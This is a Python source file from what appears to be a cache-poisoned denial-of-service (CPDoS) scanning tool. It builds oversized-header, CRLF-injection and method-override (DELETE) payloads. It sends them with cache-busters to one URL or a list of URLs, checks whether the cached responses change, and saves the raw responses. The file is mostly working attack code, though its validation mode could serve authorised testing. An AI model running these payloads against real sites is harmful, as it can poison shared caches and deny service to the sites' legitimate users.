import sys
import os

from cpdos_constants import CPDOS_ATTACKS
from cpdos_utils import adjust_extension, add_cachebuster, random_cachebuster, generate_filename
from cpdos_requests import send_raw_http_request

async def perform_cpdos_attack(
    target_url,
    attack_type,
    verbose=False,
    validate=False,
    baseline_ext=None,
    attack_ext=None,
    output_dir=None
):
    """
    Executes a CPDoS attack with optional baseline/post requests if --validate is on.
    If output_dir is provided, saves raw HTTP responses:
      - In validate mode: save baseline, attack, post
      - In non-validate mode: save attack if X-Cache != 'N/A'
    """

    if verbose or not validate:
        print(f"[*] Executing {CPDOS_ATTACKS.get(attack_type, attack_type)} attack on {target_url}...")

    # Decide how we rewrite extensions
    if baseline_ext and not attack_ext:
        base_url = adjust_extension(target_url, baseline_ext)
        atk_url  = base_url
    elif baseline_ext and attack_ext:
        base_url = adjust_extension(target_url, baseline_ext)
        atk_url  = adjust_extension(target_url, attack_ext)
    else:
        base_url = target_url
        atk_url  = target_url

    # Distinct random cbs for baseline vs. (attack+post)
    baseline_cb = random_cachebuster()
    attack_cb   = random_cachebuster()

    # Step 1: Baseline
    baseline_status = baseline_length = baseline_hash = None
    baseline_raw    = b""
    if validate:
        b_url = add_cachebuster(base_url, baseline_cb)
        b_st, b_len, b_hash, b_raw, b_xcache = send_raw_http_request(
            b_url, headers={}, verbose=verbose, validate=validate
        )
        baseline_status, baseline_length, baseline_hash = b_st, b_len, b_hash
        baseline_raw = b_raw

    # Step 2: Attack
    a_url = add_cachebuster(atk_url, attack_cb)
    # Attack headers
    if attack_type == "HHO":
        headers = {f"X-Oversized-{i}": "A" * 1024 for i in range(20)}
    elif attack_type == "HMC":
        headers = {"X-Meta-Char": "Test\r\nInjected"}
    elif attack_type == "HMO":
        headers = {"X-HTTP-Method-Override": "DELETE"}
    else:
        if verbose:
            print("[!] Invalid attack type specified.", file=sys.stderr)
        return

    a_st, a_len, a_hash, a_raw, a_xcache = send_raw_http_request(
        a_url, headers=headers, verbose=verbose, validate=validate
    )

    # Step 3: Post-attack
    post_status = post_length = post_hash = None
    post_raw    = b""
    if validate:
        p_st, p_len, p_hash, p_raw, p_xcache = send_raw_http_request(
            a_url, headers={}, verbose=verbose, validate=validate
        )
        post_status, post_length, post_hash = p_st, p_len, p_hash
        post_raw = p_raw

    success = (baseline_status != post_status) or (baseline_length != post_length) or (baseline_hash != post_hash)
    # Step 4: Compare baseline vs. post-attack in validation mode
    if validate and baseline_status is not None:
        if success:
            print(f"[+] Target changed after {attack_type} attack: {target_url}")
            print(f"    - Status Code: {baseline_status} → {a_st} → {post_status}")
            print(f"    - Content Length: {baseline_length} → {a_len} → {post_length}")
            print(f"    - Hash Match: {'✅' if baseline_hash == post_hash else '❌ Different'}")
            if verbose:
                print("\n--- Baseline Response ---")
                print(f"Status: {baseline_status} | Length: {baseline_length} | Hash: {baseline_hash}")
                print("\n--- Post-Attack Response ---")
                print(f"Status: {post_status} | Length: {post_length} | Hash: {post_hash}\n")

    # Optional file saving
    # If no output_dir, skip
    if not output_dir:
        return

    # Validate mode => always save baseline, attack, post
    if validate and success:
        # 1) Baseline
        b_file = generate_filename(base_url, "baseline")
        b_path = os.path.join(output_dir, b_file)
        try:
            with open(b_path, "wb") as f:
                f.write(baseline_raw)
                if verbose or validate:
                    print(f"Saved to: {b_path}")

        except Exception as e:
            if verbose:
                print(f"[!] Failed to save baseline response: {e}", file=sys.stderr)

        # 2) Attack
        a_file = generate_filename(atk_url, "attack")
        a_path = os.path.join(output_dir, a_file)
        try:
            with open(a_path, "wb") as f:
                f.write(a_raw)
                if verbose or validate:
                    print(f"Saved to: {a_path}")
        except Exception as e:
            if verbose:
                print(f"[!] Failed to save attack response: {e}", file=sys.stderr)

        # 3) Post
        p_file = generate_filename(atk_url, "post")
        p_path = os.path.join(output_dir, p_file)
        try:
            with open(p_path, "wb") as f:
                f.write(post_raw)
                if verbose or validate:
                    print(f"Saved to: {p_path}")
        except Exception as e:
            if verbose:
                print(f"[!] Failed to save post-attack response: {e}", file=sys.stderr)

    elif success:
        # Non-validate mode => only save if we consider it "success" e.g. X-Cache != 'N/A'
        if a_xcache != "N/A":
            a_file = generate_filename(atk_url, "attack")
            a_path = os.path.join(output_dir, a_file)
            try:
                with open(a_path, "wb") as f:
                    f.write(a_raw)
                    if verbose or validate:
                        print(f"Saved to: {a_path}")
            except Exception as e:
                if verbose:
                    print(f"[!] Failed to save attack response: {e}", file=sys.stderr)


async def process_urls(
    urls,
    attack_type,
    verbose,
    validate,
    ext1,
    ext2,
    output_dir
):
    """
    Runs CPDoS attacks against a list of URLs.
    """
    # Ensure the directory exists if provided
    if output_dir:
        import os
        try:
            os.makedirs(output_dir, exist_ok=True)
        except Exception as e:
            print(f"[!] Failed to create output directory: {e}", file=sys.stderr)
            output_dir = None

    for url in urls:
        if attack_type == "ALL":
            for atype in CPDOS_ATTACKS:
                await perform_cpdos_attack(
                    url, atype,
                    verbose=verbose,
                    validate=validate,
                    baseline_ext=ext1,
                    attack_ext=ext2,
                    output_dir=output_dir
                )
        else:
            await perform_cpdos_attack(
                url, attack_type,
                verbose=verbose,
                validate=validate,
                baseline_ext=ext1,
                attack_ext=ext2,
                output_dir=output_dir
            )
